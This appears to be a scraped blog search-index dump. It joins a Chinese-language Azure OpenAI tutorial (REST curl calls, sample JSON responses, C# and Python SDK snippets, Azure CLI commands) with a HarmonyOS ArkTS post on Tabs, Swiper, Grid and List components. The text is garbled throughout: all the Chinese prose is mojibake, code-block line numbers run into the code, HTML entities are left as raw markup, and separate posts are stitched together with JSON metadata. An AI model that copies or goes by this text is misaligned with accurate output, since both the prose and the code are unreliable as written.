https://YOUR_ENDPOINT_NAME.openai.azure.com/openai/deployments/YOUR_DEPLOYMENT_NAME/chat/completions?api-version=2023-03-15-preview \\ -H &quot;Content-Type: application/json&quot; \\ -H &quot;api-key: YOUR_API_KEY&quot; \\ -d &#x27;&#123;&quot;messages&quot;:[&#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant, teaching people about AI.&quot;&#125;,&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Does Azure OpenAI support multiple languages?&quot;&#125;,&#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;Yes, Azure OpenAI supports several languages, and can translate between them.&quot;&#125;,&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Do other Azure AI Services support translation too?&quot;&#125;]&#125;&#x27; æ¥è‡ª API çš„å“åº”å°†ç±»ä¼¼äºä»¥ä¸‹ JSONï¼š 12345678910111213141516171819202122&#123; &quot;id&quot;: &quot;chatcmpl-6v7mkQj980V1yBec6ETrKPRqFjNw9&quot;, &quot;object&quot;: &quot;chat.completion&quot;, &quot;created&quot;: 1679001781, &quot;model&quot;: &quot;gpt-35-turbo&quot;, &quot;usage&quot;: &#123; &quot;prompt_tokens&quot;: 95, &quot;completion_tokens&quot;: 84, &quot;total_tokens&quot;: 179 &#125;, &quot;choices&quot;: [ &#123; &quot;message&quot;: &#123; &quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;Yes, other Azure AI Services also support translation. Azure AI Services offer translation between multiple languages for text, documents, or custom translation through Azure AI Services Translator.&quot; &#125;, &quot;finish_reason&quot;: &quot;stop&quot;, &quot;index&quot;: 0 &#125; ]&#125; REST ç»ˆç»“ç‚¹å…è®¸æŒ‡å®šå…¶ä»–å¯é€‰è¾“å…¥å‚æ•°ï¼Œå¦‚ temperature å’Œ max_tokens ç­‰ã€‚ å¦‚æœè¦åœ¨è¯·æ±‚ä¸­åŒ…å«ä»»ä½•è¿™äº›å‚æ•°ï¼Œè¯·æ ¹æ®è¯·æ±‚å°†å®ƒä»¬æ·»åŠ åˆ°è¾“å…¥æ•°æ®ä¸­ã€‚ åµŒå…¥åµŒå…¥å¯¹æœºå™¨å­¦ä¹ æ¨¡å‹è½»æ¾ä½¿ç”¨çš„ç‰¹å®šæ ¼å¼å¾ˆæœ‰å¸®åŠ©ã€‚ è‹¥è¦ä»è¾“å…¥æ–‡æœ¬ç”ŸæˆåµŒå…¥ï¼Œè¯·å‘ embeddings ç»ˆç»“ç‚¹å‘å‡º POST è¯·æ±‚ã€‚ 1234curl https://YOUR_ENDPOINT_NAME.openai.azure.com/openai/deployments/YOUR_DEPLOYMENT_NAME/embeddings?api-version=2022-12-01 \\ -H &quot;Content-Type: application/json&quot; \\ -H &quot;api-key: YOUR_API_KEY&quot; \\ -d &quot;&#123;\\&quot;input\\&quot;: \\&quot;The food was delicious and the waiter...\\&quot;&#125;&quot; ç”ŸæˆåµŒå…¥æ—¶ï¼Œè¯·ç¡®ä¿åœ¨ Azure OpenAI ä¸­ä½¿ç”¨ç”¨äºåµŒå…¥çš„æ¨¡å‹ã€‚ è¿™äº›æ¨¡å‹ä»¥ text-embedding æˆ– text-similarity å¼€å¤´ï¼Œå…·ä½“å–å†³äºä½ è¦æŸ¥æ‰¾çš„åŠŸèƒ½ã€‚ æ¥è‡ª API çš„å“åº”å°†ç±»ä¼¼äºä»¥ä¸‹ JSONï¼š 12345678910111213141516&#123; &quot;object&quot;: &quot;list&quot;, &quot;data&quot;: [ &#123; &quot;object&quot;: &quot;embedding&quot;, &quot;embedding&quot;: [ 0.0172990688066482523, -0.0291879814639389515, .... 0.0134544348834753042, ], &quot;index&quot;: 0 &#125; ], &quot;model&quot;: &quot;text-embedding-ada:002&quot;&#125; ä½¿ç”¨ Azure OpenAI SDKé™¤äº†ä¸Šä¸€å•å…ƒä¸­ä»‹ç»çš„ REST API å¤–ï¼Œç”¨æˆ·è¿˜å¯ä»¥é€šè¿‡ C# å’Œ Python SDK è®¿é—® Azure OpenAI æ¨¡å‹ã€‚ é€šè¿‡ REST å’Œè¿™äº› SDK æä¾›ç›¸åŒçš„åŠŸèƒ½ã€‚ æ³¨æ„ åœ¨ä½¿ç”¨ä»»ä¸€ SDK ä¸ API äº¤äº’ä¹‹å‰ï¼Œå¿…é¡»åœ¨ Azure é—¨æˆ·ä¸­åˆ›å»º Azure OpenAI èµ„æºï¼Œåœ¨è¯¥èµ„æºä¸­éƒ¨ç½²æ¨¡å‹ï¼Œå¹¶æ£€ç´¢ç»ˆç»“ç‚¹å’Œå¯†é’¥ã€‚ è¯·æŸ¥çœ‹ Azure OpenAI æœåŠ¡å…¥é—¨ï¼Œäº†è§£å¦‚ä½•æ‰§è¡Œæ­¤æ“ä½œã€‚ å¯¹äºæœ¬å•å…ƒä¸­ä»‹ç»çš„ SDKï¼Œéœ€è¦ Azure OpenAI èµ„æºçš„ç»ˆç»“ç‚¹å’Œå¯†é’¥ï¼Œä»¥åŠä¸ºéƒ¨ç½²çš„æ¨¡å‹æä¾›çš„åç§°ã€‚ åœ¨ä»¥ä¸‹ä»£ç ç‰‡æ®µä¸­ï¼Œä½¿ç”¨ä»¥ä¸‹å ä½ç¬¦ï¼š å ä½ç¬¦åç§° å€¼ YOUR_ENDPOINT_NAME æ­¤åŸºæœ¬ç»ˆç»“ç‚¹ä½äº Azure é—¨æˆ·çš„â€œå¯†é’¥å’Œç»ˆç»“ç‚¹â€éƒ¨åˆ†ã€‚ å®ƒæ˜¯èµ„æºçš„åŸºæœ¬ç»ˆç»“ç‚¹ï¼Œä¾‹å¦‚ https://sample.openai.azure.com/ã€‚ YOUR_API_KEY å¯†é’¥ä½äº Azure é—¨æˆ·çš„â€œå¯†é’¥å’Œç»ˆç»“ç‚¹â€éƒ¨åˆ†ã€‚ å¯ä»¥åœ¨èµ„æºä¸­ä½¿ç”¨ä»»ä¸€å¯†é’¥ã€‚ YOUR_DEPLOYMENT_NAME æ­¤éƒ¨ç½²åç§°æ˜¯åœ¨ Azure OpenAI Studio ä¸­éƒ¨ç½²æ¨¡å‹æ—¶æä¾›çš„åç§°ã€‚ å®‰è£…åº“é¦–å…ˆï¼Œå®‰è£…é¦–é€‰è¯­è¨€çš„å®¢æˆ·ç«¯åº“ã€‚ C# SDK æ˜¯ REST API çš„ .NET é€‚åº”ï¼Œä¸“ä¸º Azure OpenAI è€Œæ„å»ºï¼Œä½†å®ƒå¯ç”¨äºè¿æ¥åˆ° Azure OpenAI èµ„æºæˆ–é Azure OpenAI ç»ˆç»“ç‚¹ã€‚ Python SDK ç”± OpenAI ç”Ÿæˆå’Œç»´æŠ¤ã€‚ 1dotnet add package Azure.AI.OpenAI --prerelease é…ç½®åº”ç”¨ä»¥è®¿é—® Azure OpenAI èµ„æºæ¯ç§è¯­è¨€çš„é…ç½®ç•¥æœ‰ä¸åŒï¼Œä½†ä¸¤ç§è¯­è¨€éƒ½éœ€è¦è®¾ç½®ç›¸åŒçš„å‚æ•°ã€‚ å¿…éœ€çš„å‚æ•°æ˜¯ endpointã€key å’Œéƒ¨ç½²çš„åç§°ï¼Œå½“å‘æ¨¡å‹å‘é€æç¤ºæ—¶ï¼Œéƒ¨ç½²çš„åç§°è¢«ç§°ä¸º engineã€‚ å°†åº“æ·»åŠ åˆ°åº”ç”¨ï¼Œå¹¶ä¸ºå®¢æˆ·ç«¯è®¾ç½®æ‰€éœ€çš„å‚æ•°ã€‚ 123456789// Add OpenAI libraryusing Azure.AI.OpenAI;// Define parameters and initialize the clientstring endpoint = &quot;&lt;YOUR_ENDPOINT_NAME&gt;&quot;;string key = &quot;&lt;YOUR_API_KEY&gt;&quot;;string deploymentName = &quot;&lt;YOUR_DEPLOYMENT_NAME&gt;&quot;; OpenAIClient client = new OpenAIClient(new Uri(endpoint), new AzureKeyCredential(key)); 1234567891011# Add OpenAI libraryfrom openai import AzureOpenAIdeployment_name = &#x27;&lt;YOUR_DEPLOYMENT_NAME&gt;&#x27; # Initialize the Azure OpenAI clientclient = AzureOpenAI( azure_endpoint = &#x27;&lt;YOUR_ENDPOINT_NAME&gt;&#x27;, api_key=&#x27;&lt;YOUR_API_KEY&gt;&#x27;, api_version=&quot;20xx-xx-xx&quot; # Target version of the API, such as 2024-02-15-preview ) è°ƒç”¨ Azure OpenAI èµ„æºé…ç½®ä¸ Azure OpenAI çš„è¿æ¥åï¼Œå°†æç¤ºå‘é€ç»™æ¨¡å‹ã€‚ 1234567891011121314151617// Build completion options objectChatCompletionsOptions chatCompletionsOptions = new ChatCompletionsOptions()&#123; Messages = &#123; new ChatRequestSystemMessage(&quot;You are a helpful AI bot.&quot;), new ChatRequestUserMessage(&quot;What is Azure OpenAI?&quot;), &#125;, DeploymentName = deploymentName&#125;;// Send request to Azure OpenAI modelChatCompletions response = client.GetChatCompletions(chatCompletionsOptions);// Print the responsestring completion = response.Choices[0].Message.Content;Console.WriteLine(&quot;Response: &quot; + completion + &quot;\\n&quot;); 1234567891011response = client.chat.completions.create( model=deployment_name, messages=[ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant.&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;What is Azure OpenAI?&quot;&#125; ])generated_text = response.choices[0].message.content# Print the responseprint(&quot;Response: &quot; + generated_text + &quot;\\n&quot;) å“åº”å¯¹è±¡åŒ…å«å¤šä¸ªå€¼ï¼Œä¾‹å¦‚ total_tokens å’Œ finish_reasonã€‚ å“åº”å¯¹è±¡çš„å®Œæˆç±»ä¼¼äºä»¥ä¸‹å®Œæˆï¼š 1&quot;Azure OpenAI is a cloud-based artificial intelligence (AI) service that offers a range of tools and services for developing and deploying AI applications. Azure OpenAI provides a variety of services for training and deploying machine learning models, including a managed service for training and deploying deep learning models, a managed service for deploying machine learning models, and a managed service for managing and deploying machine learning models.&quot; åœ¨ C# å’Œ Python ä¸­ï¼Œè°ƒç”¨å¯ä»¥åŒ…å«å¯é€‰å‚æ•°ï¼Œå…¶ä¸­åŒ…æ‹¬ temperature å’Œ max_tokensã€‚ æœ¬æ¨¡å—çš„å®éªŒå®¤ä¸­åŒ…å«äº†ä½¿ç”¨è¿™äº›å‚æ•°çš„ç¤ºä¾‹ã€‚ å‘ Azure OpenAI èµ„æºå‘å‡ºè¯·æ±‚éœ€è¦å“ªäº›èµ„æºå€¼ï¼Ÿ å¯†é’¥ã€ç»ˆç»“ç‚¹å’Œéƒ¨ç½²åç§°å“ªä¸‰ä¸ªç»ˆç»“ç‚¹å¯ç”¨äºä¸å·²éƒ¨ç½²çš„ Azure OpenAI æ¨¡å‹äº¤äº’ï¼ŸCompletionã€ChatCompletion å’Œ Embeddingså“ªä¸€ä¸ªæ˜¯ Azure OpenAI ä¸­ä¸ºä¼šè¯çš„ä¸‹ä¸€ä¸ª Completion å»ºæ¨¡çš„æœ€ä½³å¯ç”¨ç»ˆç»“ç‚¹ï¼ŸChatCompletion æ¥è‡ª https://learn.microsoft.com/zh-cn/collections/e6kjarx0q38?WT.mc_id=cloudskillschallenge_0bc0dea3-e83b-44f1-99a1-f91a1c041817","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Azure","slug":"Azure","permalink":"https://banjinmei.github.io/tags/Azure/"},{"name":"OpenAI","slug":"OpenAI","permalink":"https://banjinmei.github.io/tags/OpenAI/"}],"author":"mu"},{"title":"HarmonyOS Tabs Component","slug":"HarmonyOS-Tabs-Component","date":"2024-06-01T15:52:32.000Z","updated":"2024-12-15T05:10:15.139Z","comments":true,"path":"2024/06/01/HarmonyOS-Tabs-Component/","permalink":"https://banjinmei.github.io/2024/06/01/HarmonyOS-Tabs-Component/","excerpt":"","text":"ğŸ”®Tabs1234Tabs()&#123; TabContent()&#123; &#125;&#125; example 1234567891011121314151617181920212223242526Tabs(&#123;barPosition:BarPosition.End&#125;)&#123; ForEach(this.ilist,(item,index)=&gt;&#123; TabContent()&#123; Column( )&#123; Text(item.title) .fontSize(&#x27;18fp&#x27;) &#125; .width(&#x27;100%&#x27;) .height(&#x27;100%&#x27;) .backgroundColor(&#x27;#FFFFFF&#x27;) &#125; .tabBar(this.tabTile(index,item.title,item.url1,item.url2)) &#125;) &#125; .vertical(false) .scrollable(true)//huadong .animationDuration(400) .width(&#x27;100%&#x27;) .backgroundColor(&#x27;#fffff1&#x27;) //.height(&#x27;100vp&#x27;) .onChange((value) =&gt; &#123; this.curIndex = value; &#125;) ğŸ®ï¸tab data123456789101112131415161718192021222324interface INav&#123; title:string; url1:Resource; url2 :Resource;&#125;//... @State ilist:INav[]=[&#123; title:&#x27;index&#x27;, url1:$r(&#x27;app.media.icon&#x27;), url2:$r(&#x27;app.media.icon2&#x27;) &#125;, &#123; title:&#x27;hot&#x27;, url1:$r(&#x27;app.media.icon&#x27;), url2:$r(&#x27;app.media.icon2&#x27;) &#125;, &#123; title:&#x27;my&#x27;, url1:$r(&#x27;app.media.icon&#x27;), url2:$r(&#x27;app.media.icon2&#x27;) &#125; ]; barPosition:BarPosition.End åº•éƒ¨ barPosition:BarPosition.Start é¡¶éƒ¨ ğŸª…Component swpier12345678910111213141516171819202122232425@Componentexport default struct swiper1&#123; public ilist:Array&lt;Resource&gt; =[ $r(&#x27;app.media.22222&#x27;), $r(&#x27;app.media.11111&#x27;), $r(&#x27;app.media.22222&#x27;) ] build()&#123; Column()&#123; Swiper()&#123; ForEach(this.ilist,(item,index)=&gt;&#123; Image(item).width(&#x27;98%&#x27;).height(&#x27;160vp&#x27;) &#125;) &#125; .autoPlay(true) .interval(3000) .duration(400) .indicator(true) .itemSpace(5) &#125; &#125;&#125; add imgâ€¦ index import 123swipert() .height(&#x27;80%&#x27;) .margin(&#x27;10vp&#x27;) ğŸ°Component nav Grid1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950interface inavit&#123; title:string, img:Resource&#125;@Componentexport default struct homenav&#123; public ilist:Array&lt;inavit&gt; =[ &#123;title:&#x27;w&#x27;,img: $r(&#x27;app.media.110&#x27;)&#125;,&#123;title:&#x27;z&#x27;,img: $r(&#x27;app.media.111&#x27;)&#125;,&#123;title:&#x27;r&#x27;,img: $r(&#x27;app.media.120&#x27;)&#125;,&#123;title:&#x27;y&#x27;,img: $r(&#x27;app.media.129&#x27;)&#125;,&#123;title:&#x27;j&#x27;,img: $r(&#x27;app.media.140&#x27;)&#125;,&#123;title:&#x27;y&#x27;,img: $r(&#x27;app.media.150&#x27;)&#125;,&#123;title:&#x27;c&#x27;,img: $r(&#x27;app.media.163&#x27;)&#125;, &#123;title:&#x27;j&#x27;,img: $r(&#x27;app.media.173&#x27;)&#125; ] build()&#123; Column()&#123; Grid()&#123; ForEach(this.ilist,(item:inavit,index:number)=&gt;&#123; GridItem()&#123; Column(&#123;space:5&#125;)&#123; Image(item.img).width(&#x27;50vp&#x27;).height(&#x27;50vp&#x27;) Text(item.title).fontSize(&#x27;18fp&#x27;) &#125; &#125; &#125;) &#125; .columnsTemplate(&#x27;1fr 1fr 1fr 1fr&#x27;) .rowsGap(&#x27;10&#x27;) .margin(&#x27;10&#x27;) //.backgroundColor() &#125; &#125;&#125; index import 12homenav1() .height(&#x27;60%&#x27;) ğŸ•¹ï¸Component List12345678910111213141516171819202122232425262728@Componentexport default struct homelist&#123; build()&#123; Column()&#123; List() &#123; ListItem()&#123; Image($r(&#x27;app.media.666&#x27;)) .objectFit(ImageFit.Cover) .aspectRatio(2.7) .margin(&#x27;10vp&#x27;) &#125; ListItem()&#123; Image($r(&#x27;app.media.777&#x27;)) .objectFit(ImageFit.Cover) .aspectRatio(2.7) .margin(&#x27;10vp&#x27;) &#125; &#125; // Text(&#x27;hhhh&#x27;) &#125; &#125;&#125; Errdoes not meet UI component syntax.ç»„ä»¶å£°æ˜é”™è¯¯","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HarmonyOS","slug":"HarmonyOS","permalink":"https://banjinmei.github.io/tags/HarmonyOS/"}],"author":"mu"},{"title":"Azure OpenAI Solution","slug":"Azure-AI","date":"2024-06-01T12:02:53.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/06/01/Azure-AI/","permalink":"https://banjinmei.github.io/2024/06/01/Azure-AI/","excerpt":"","text":"å¼€å§‹ä½¿ç”¨ Azure OpenAI æœåŠ¡ç®€ä»‹å‡è®¾ä½ æƒ³è¦ç”Ÿæˆä¸€ä¸ªæ±‡æ€»æ–‡æœ¬å’Œå»ºè®®ä»£ç çš„æ”¯æŒåº”ç”¨ç¨‹åºã€‚ è‹¥è¦ç”Ÿæˆæ­¤åº”ç”¨ï¼Œéœ€è¦åˆ©ç”¨ ChatGPT ä¸­æ˜¾ç¤ºçš„åŠŸèƒ½ï¼ŒChatGPT æ˜¯ OpenAI ç ”ç©¶å…¬å¸æ„å»ºçš„èŠå¤©æœºå™¨äººï¼Œå®ƒæ¥å—ç”¨æˆ·çš„è‡ªç„¶è¯­è¨€è¾“å…¥ï¼Œå¹¶è¿”å›æœºå™¨åˆ›å»ºçš„ç±»äººå“åº”ã€‚ ç”Ÿæˆå¼ AI æ¨¡å‹æ”¯æŒ ChatGPT åŸºäºè‡ªç„¶è¯­è¨€æç¤ºç”Ÿæˆæ–°å†…å®¹ï¼ˆå¦‚æ–‡æœ¬ã€ä»£ç å’Œå›¾åƒï¼‰çš„èƒ½åŠ›ã€‚ è®¸å¤šç”Ÿæˆ AI æ¨¡å‹æ˜¯æ·±åº¦å­¦ä¹ ç®—æ³•çš„å­é›†ã€‚ è¿™äº›ç®—æ³•æ”¯æŒè§†è§‰ã€è¯­éŸ³ã€è¯­è¨€ã€å†³ç­–ã€æœç´¢ç­‰å„ç§å·¥ä½œè´Ÿè½½ã€‚ Azure OpenAI æœåŠ¡å°†è¿™äº›ç”Ÿæˆå¼ AI æ¨¡å‹å¼•å…¥ Azure å¹³å°ï¼Œä½¿ä½ èƒ½å¤Ÿå¼€å‘åŠŸèƒ½å¼ºå¤§çš„ AI è§£å†³æ–¹æ¡ˆï¼Œè¿™äº›è§£å†³æ–¹æ¡ˆå—ç›Šäº Azure äº‘å¹³å°æä¾›çš„å…¶ä»–æœåŠ¡çš„å®‰å…¨æ€§ã€å¯ä¼¸ç¼©æ€§å’Œé›†æˆã€‚ è¿™äº›æ¨¡å‹å¯ç”¨äºé€šè¿‡ REST APIã€å„ç§ SDK å’Œ Studio æ¥å£ç”Ÿæˆåº”ç”¨ç¨‹åºã€‚ æœ¬æ¨¡å—å°†æŒ‡å¯¼ä½ å®Œæˆ Azure OpenAI Studio ä½“éªŒï¼Œä¸ºä½ ä½¿ç”¨ç”Ÿæˆå¼ AI è¿›ä¸€æ­¥å¼€å‘è§£å†³æ–¹æ¡ˆå¥ å®šäº†åŸºç¡€ã€‚ è®¿é—® Azure OpenAI æœåŠ¡ä½¿ç”¨ Azure OpenAI æ„å»ºç”Ÿæˆå‹ AI è§£å†³æ–¹æ¡ˆçš„ç¬¬ä¸€æ­¥æ˜¯åœ¨ Azure è®¢é˜…ä¸­é¢„é… Azure OpenAI èµ„æºã€‚ Azure OpenAI æœåŠ¡ç›®å‰å¤„äºå—é™è®¿é—®çŠ¶æ€ã€‚ ç”¨æˆ·éœ€è¦åœ¨ https://aka.ms/oai/access ä¸Šç”³è¯·æœåŠ¡è®¿é—®æƒé™ã€‚ æ³¨æ„ Azure OpenAI æœåŠ¡å·²å‘å¸ƒï¼Œä½†æ”¯æŒä»¥åˆä¹é“å¾·çš„æ–¹å¼ä½¿ç”¨è¯¥æœåŠ¡çš„è®¿é—®æƒé™æœ‰é™ã€‚ å¯ä»¥åœ¨æ­¤å¤„é˜…è¯» Azure OpenAI æœåŠ¡çš„ Microsoft é€æ˜åº¦è¯´æ˜ã€‚ æœ‰æƒè®¿é—® Azure OpenAI æœåŠ¡åï¼Œå¯ä»¥é€šè¿‡åœ¨ Azure é—¨æˆ·ä¸­åˆ›å»ºèµ„æºæˆ–ä½¿ç”¨ Azure å‘½ä»¤è¡Œæ¥å£ (CLI) å¼€å§‹ã€‚ åœ¨ Azure é—¨æˆ·ä¸­åˆ›å»º Azure OpenAI æœåŠ¡èµ„æºåˆ›å»º Azure OpenAI æœåŠ¡èµ„æºæ—¶ï¼Œéœ€è¦æä¾›è®¢é˜…åç§°ã€èµ„æºç»„åç§°ã€åŒºåŸŸã€å”¯ä¸€å®ä¾‹åç§°ï¼Œå¹¶é€‰æ‹©å®šä»·å±‚ã€‚ åœ¨ Azure CLI ä¸­åˆ›å»º Azure OpenAI æœåŠ¡èµ„æºè‹¥è¦ä» CLI åˆ›å»º Azure OpenAI æœåŠ¡èµ„æºï¼Œè¯·å‚é˜…æ­¤ç¤ºä¾‹ï¼Œå¹¶å°†ä»¥ä¸‹å˜é‡æ›¿æ¢ä¸ºè‡ªå·±çš„å˜é‡ï¼š MyOpenAIResourceï¼šæ›¿æ¢ä¸ºèµ„æºçš„å”¯ä¸€åç§° OAIResourceGroupï¼šæ›¿æ¢ä¸ºèµ„æºç»„åç§° eastusï¼šæ›¿æ¢ä¸ºè¦éƒ¨ç½²èµ„æºçš„åŒºåŸŸ subscriptionIDï¼šæ›¿æ¢ä¸ºè®¢é˜… ID 1234567az cognitiveservices account create \\-n MyOpenAIResource \\-g OAIResourceGroup \\-l eastus \\--kind OpenAI \\--sku s0 \\--subscription subscriptionID æ³¨æ„ å¯ä»¥é€šè¿‡ CLI å‘½ä»¤ az account list-locations æŸ¥æ‰¾å¯ç”¨äºæœåŠ¡çš„åŒºåŸŸã€‚ è‹¥è¦äº†è§£å¦‚ä½•é€šè¿‡ CLI ç™»å½•åˆ° Azure å¹¶åˆ›å»º Azure ç»„ï¼Œè¯·å‚é˜…æ­¤å¤„çš„æ–‡æ¡£ã€‚ åŒºåŸŸå¯ç”¨æ€§Azure OpenAI æœåŠ¡æä¾›äº†å¯¹å¤šç§ç±»å‹çš„æ¨¡å‹çš„è®¿é—®ã€‚ æŸäº›æ¨¡å‹ä»…åœ¨é€‰å®šåŒºåŸŸä¸­å¯ç”¨ã€‚ æœ‰å…³åŒºåŸŸå¯ç”¨æ€§ï¼Œè¯·å‚é˜… Azure OpenAI æ¨¡å‹å¯ç”¨æ€§æŒ‡å—ã€‚ å¯ä»¥ä¸ºæ¯ä¸ªåŒºåŸŸåˆ›å»ºä¸¤ä¸ª Azure OpenAI èµ„æºã€‚ Azure OpenAI Studio æä¾›å¯¹æ¨¡å‹ç®¡ç†ã€éƒ¨ç½²ã€è¯•éªŒã€è‡ªå®šä¹‰å’Œå­¦ä¹ èµ„æºçš„è®¿é—®æƒé™ã€‚ åˆ›å»ºèµ„æºåï¼Œå¯ä»¥é€šè¿‡ Azure é—¨æˆ·è®¿é—® Azure OpenAI Studioï¼Œä¹Ÿå¯ä»¥åœ¨ https://oai.azure.com é€šè¿‡ä½¿ç”¨ Azure OpenAI èµ„æºå®ä¾‹ç™»å½•æ¥è®¿é—® Azure OpenAI Studioã€‚ åœ¨ç™»å½•å·¥ä½œæµä¸­ï¼Œé€‰æ‹©é€‚å½“çš„ç›®å½•ã€Azure è®¢é˜…å’Œ Azure OpenAI èµ„æºã€‚ é¦–æ¬¡æ‰“å¼€ Azure OpenAI Studio æ—¶ï¼Œå±å¹•é¡¶éƒ¨ä¼šæ˜¾ç¤ºä¸€ä¸ªâ€œè¡ŒåŠ¨å·å¬â€æŒ‰é’®ï¼Œç”¨äºéƒ¨ç½²ç¬¬ä¸€ä¸ªæ¨¡å‹ã€‚ é€‰æ‹©åˆ›å»ºæ–°éƒ¨ç½²çš„é€‰é¡¹ä¼šæ‰“å¼€â€œéƒ¨ç½²â€é¡µï¼Œä»ä¸­å¯ä»¥éƒ¨ç½²åŸºç¡€æ¨¡å‹å¹¶å¼€å§‹è¯•éªŒã€‚ æ¢ç´¢ç”Ÿæˆå¼ AI æ¨¡å‹çš„ç±»å‹è‹¥è¦å¼€å§‹ä½¿ç”¨ Azure OpenAI è¿›è¡Œç”Ÿæˆï¼Œéœ€è¦é€‰æ‹©ä¸€ä¸ªåŸºç¡€æ¨¡å‹å¹¶è¿›è¡Œéƒ¨ç½²ã€‚ Microsoft æä¾›åŸºç¡€æ¨¡å‹ä»¥åŠåˆ›å»ºè‡ªå®šä¹‰åŸºç¡€æ¨¡å‹çš„é€‰é¡¹ã€‚ æœ¬æ¨¡å—ä»‹ç»å½“å‰å¯ç”¨çš„åŸºç¡€æ¨¡å‹ã€‚ Azure OpenAI åŒ…æ‹¬å¤šç§ç±»å‹çš„æ¨¡å‹ï¼š GPT-4 æ¨¡å‹æ˜¯æœ€æ–°ä¸€ä»£çš„ç”Ÿæˆå¼é¢„è®­ç»ƒ (GPT) æ¨¡å‹ï¼Œå¯ä»¥æ ¹æ®è‡ªç„¶è¯­è¨€æç¤ºç”Ÿæˆè‡ªç„¶è¯­è¨€å’Œä»£ç è¡¥å…¨ã€‚ GPT 3.5 æ¨¡å‹å¯ä»¥æ ¹æ®è‡ªç„¶è¯­è¨€æç¤ºç”Ÿæˆè‡ªç„¶è¯­è¨€å’Œä»£ç è¡¥å…¨ã€‚ å…·ä½“è€Œè¨€ï¼ŒGPT-35-turbo æ¨¡å‹é’ˆå¯¹åŸºäºèŠå¤©çš„äº¤äº’è¿›è¡Œäº†ä¼˜åŒ–ï¼Œåœ¨å¤§å¤šæ•°ç”Ÿæˆå¼ AI æ–¹æ¡ˆä¸­éƒ½è¡¨ç°è‰¯å¥½ã€‚ åµŒå…¥æ¨¡å‹å°†æ–‡æœ¬è½¬æ¢ä¸ºæ•°å­—å‘é‡ï¼Œå¹¶ä¸”åœ¨è¯­è¨€åˆ†ææ–¹æ¡ˆï¼ˆä¾‹å¦‚æ¯”è¾ƒæ–‡æœ¬æºçš„ç›¸ä¼¼æ€§ï¼‰ä¸­éå¸¸æœ‰ç”¨ã€‚ DALL-E æ¨¡å‹ç”¨äºåŸºäºè‡ªç„¶è¯­è¨€æç¤ºç”Ÿæˆå›¾åƒã€‚ ç›®å‰ï¼ŒDALL-E æ¨¡å‹å¤„äºé¢„è§ˆé˜¶æ®µã€‚ DALL-E æ¨¡å‹æœªåœ¨ Azure OpenAI Studio ç•Œé¢ä¸­åˆ—å‡ºï¼Œå¹¶ä¸”ä¸éœ€è¦æ˜¾å¼éƒ¨ç½²ã€‚ æ¨¡å‹å› é€Ÿåº¦ã€æˆæœ¬å’Œå®Œæˆç‰¹å®šä»»åŠ¡çš„å‡ºè‰²ç¨‹åº¦è€Œå¼‚ã€‚ å¯ä»¥è¯¦ç»†äº†è§£ Azure OpenAI æœåŠ¡æ–‡æ¡£ä¸­ä»‹ç»çš„å·®å¼‚å’Œæœ€æ–°æ¨¡å‹ã€‚ æ³¨æ„ å®šä»·ç”±ä»¤ç‰Œå’Œæ¨¡å‹ç±»å‹å†³å®šã€‚ åœ¨æ­¤å¤„è¯¦ç»†äº†è§£æœ€æ–°å®šä»·ã€‚ åœ¨ Azure OpenAI Studio ä¸­ï¼Œâ€œæ¨¡å‹â€é¡µåˆ—å‡ºäº†å¯ç”¨çš„åŸºç¡€æ¨¡å‹ï¼ˆDALL-E æ¨¡å‹é™¤å¤–ï¼‰ï¼Œå¹¶æä¾›äº†é€šè¿‡å¾®è°ƒåŸºæœ¬æ¨¡å‹æ¥åˆ›å»ºå…¶ä»–è‡ªå®šä¹‰æ¨¡å‹çš„é€‰é¡¹ã€‚ æ¨¡å‹çŠ¶æ€ä¸ºâ€œæˆåŠŸâ€æ„å‘³ç€å®ƒä»¬å·²æˆåŠŸè®­ç»ƒï¼Œå¹¶ä¸”å¯è¢«é€‰æ‹©ç”¨äºéƒ¨ç½²ã€‚ éƒ¨ç½²ç”Ÿæˆå¼ AI æ¨¡å‹é¦–å…ˆéœ€è¦éƒ¨ç½²ä¸€ä¸ªæ¨¡å‹ï¼Œä»¥ä¾¿è¿›è¡Œ API è°ƒç”¨ï¼Œä»è€Œæ¥æ”¶æç¤ºå®Œæˆã€‚ åˆ›å»ºæ–°éƒ¨ç½²æ—¶ï¼Œéœ€è¦æŒ‡å‡ºè¦éƒ¨ç½²çš„åŸºç¡€æ¨¡å‹ã€‚ å¯ä»¥åœ¨ä¸€ä¸ªæˆ–å¤šä¸ª Azure OpenAI èµ„æºä¸­å®ç°ä»»æ„æ•°é‡çš„éƒ¨ç½²ï¼Œåªè¦å®ƒä»¬çš„ TPM æ€»æ•°åœ¨é‚£ä¸ªåŒºåŸŸä¸­ä½äº 240Kã€‚ å¯é€šè¿‡å¤šç§æ–¹å¼éƒ¨ç½²åŸºç¡€æ¨¡å‹ã€‚ ä½¿ç”¨ Azure OpenAI Studio è¿›è¡Œéƒ¨ç½²åœ¨ Azure OpenAI Studio çš„â€œéƒ¨ç½²â€é¡µä¸­ï¼Œå¯ä»¥é€šè¿‡ä»èœå•ä¸­é€‰æ‹©æ¨¡å‹åç§°æ¥åˆ›å»ºæ–°éƒ¨ç½²ã€‚ å¯ç”¨çš„åŸºç¡€æ¨¡å‹æ¥è‡ªæ¨¡å‹é¡µä¸­çš„åˆ—è¡¨ã€‚ åœ¨ Studio 